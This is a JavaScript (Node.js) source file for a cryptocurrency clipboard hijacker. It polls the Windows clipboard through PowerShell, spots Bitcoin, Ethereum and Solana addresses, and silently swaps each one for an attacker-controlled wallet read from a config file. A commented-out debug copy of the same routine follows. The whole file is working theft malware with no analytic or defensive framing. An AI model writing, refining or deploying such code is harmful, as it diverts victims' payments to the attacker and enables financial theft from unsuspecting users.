const { exec } = require('child_process');
const { WALLET_PATTERNS, YOUR_WALLETS } = require('./config');

function clipper() {
    console.log("[CLIPPER] Clipboard monitor started (quiet mode)");

    setInterval(() => {
        try {
            exec('powershell -command "Get-Clipboard"', (err, stdout, stderr) => {
                if (err || stderr) return;

                const clip = stdout.trim();
                if (!clip) return;

                let swapped = false;

                // Explicit order + prefix checks (fixes BTC → SOL false positive)
                const checks = [
                    { chain: 'BTC', regex: WALLET_PATTERNS.BTC, prefixCheck: clip.startsWith('1') || clip.startsWith('3') || clip.startsWith('bc1') },
                    { chain: 'ETH', regex: WALLET_PATTERNS.ETH, prefixCheck: clip.startsWith('0x') },
                    { chain: 'SOL', regex: WALLET_PATTERNS.SOL, prefixCheck: !clip.startsWith('0x') && !clip.startsWith('1') && !clip.startsWith('3') && !clip.startsWith('bc1') }
                ];

                for (const check of checks) {
                    const { chain, regex, prefixCheck } = check;

                    if (prefixCheck && regex.test(clip) && clip !== YOUR_WALLETS[chain]) {
                        const newAddr = YOUR_WALLETS[chain];

                        exec(`powershell -command "Set-Clipboard -Value '${newAddr.replace(/'/g, "\\'")}'"`, (setErr) => {
                            if (!setErr) {
                                console.log(`[CLIPPER] Swapped ${chain} address`);
                            }
                        });

                        swapped = true;
                        break;
                    }
                }
            });
        } catch {}
    }, 1500);
}

module.exports = { clipper };

/**
function clipper() {
    console.log("[DEBUG] Starting PowerShell clipboard clipper...");

    setInterval(() => {
        try {
            exec('powershell -command "Get-Clipboard"', (err, stdout, stderr) => {
                if (err) {
                    console.error("[CLIPPER ERROR] PowerShell Get-Clipboard failed:", err.message);
                    return;
                }
                if (stderr) {
                    console.error("[CLIPPER STDERR]:", stderr.trim());
                }

                const clip = stdout.trim();
                console.log("[CLIPPER DEBUG] Raw clipboard content:", clip || "(empty)");

                if (!clip) {
                    console.log("[CLIPPER DEBUG] Clipboard is empty — skipping");
                    return;
                }

                let swapped = false;

                // Explicit order: BTC first, then ETH, SOL last
                const checks = [
                    { chain: 'BTC', regex: WALLET_PATTERNS.BTC, prefixCheck: clip.startsWith('1') || clip.startsWith('3') || clip.startsWith('bc1') },
                    { chain: 'ETH', regex: WALLET_PATTERNS.ETH, prefixCheck: clip.startsWith('0x') },
                    { chain: 'SOL', regex: WALLET_PATTERNS.SOL, prefixCheck: !clip.startsWith('0x') && !clip.startsWith('1') && !clip.startsWith('3') && !clip.startsWith('bc1') }
                ];

                for (const check of checks) {
                    const { chain, regex, prefixCheck } = check;
                    console.log(`[CLIPPER DEBUG] Checking ${chain} (prefix OK: ${prefixCheck}) on: ${clip.substring(0, 20)}...`);

                    if (prefixCheck && regex.test(clip)) {
                        const newAddr = YOUR_WALLETS[chain];

                        if (clip === newAddr) {
                            console.log(`[CLIPPER DEBUG] Clipboard already is ${chain} wallet — skipping`);
                            continue;
                        }

                        console.log(`[CLIPPER DEBUG] MATCH! ${chain} — swapping to: ${newAddr}`);

                        exec(`powershell -command "Set-Clipboard -Value '${newAddr.replace(/'/g, "\\'")}'"`, (setErr) => {
                            if (setErr) {
                                console.error("[CLIPPER ERROR] Set-Clipboard failed:", setErr.message);
                            } else {
                                console.log(`[SUCCESS] Clipboard swapped for ${chain} to ${newAddr}`);
                            }
                        });

                        swapped = true;
                        break;
                    }
                }

                if (!swapped) {
                    console.log("[CLIPPER DEBUG] No valid wallet address detected in clipboard");
                }
            });
        } catch (e) {
            console.error("[CLIPPER CRASH] Outer try-catch error:", e.message);
        }
    }, 1500);
}

module.exports = { clipper };
*/
